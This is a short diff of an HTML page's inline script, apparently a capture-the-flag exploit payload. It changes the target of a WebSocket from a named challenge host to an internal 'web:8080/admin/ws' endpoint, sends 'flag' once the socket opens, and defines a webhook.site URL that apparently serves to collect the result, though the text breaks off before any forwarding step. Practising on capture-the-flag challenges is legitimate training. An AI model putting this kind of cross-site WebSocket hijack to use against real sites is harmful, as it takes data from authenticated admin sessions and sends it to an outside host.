@@ -3,7 +3,7 @@
 <head>
     <script>
         const webhookURL = "https://webhook.site/f011cfac-cc82-4434-a338-ba4ae15c846e";
-        const wsURL = "ws://ce441-web.spchallenge.ir:8080/admin/ws";
+        const wsURL = "ws://web:8080/admin/ws";
         const ws = new WebSocket(wsURL);
 
         ws.onopen = () => ws.send("flag");
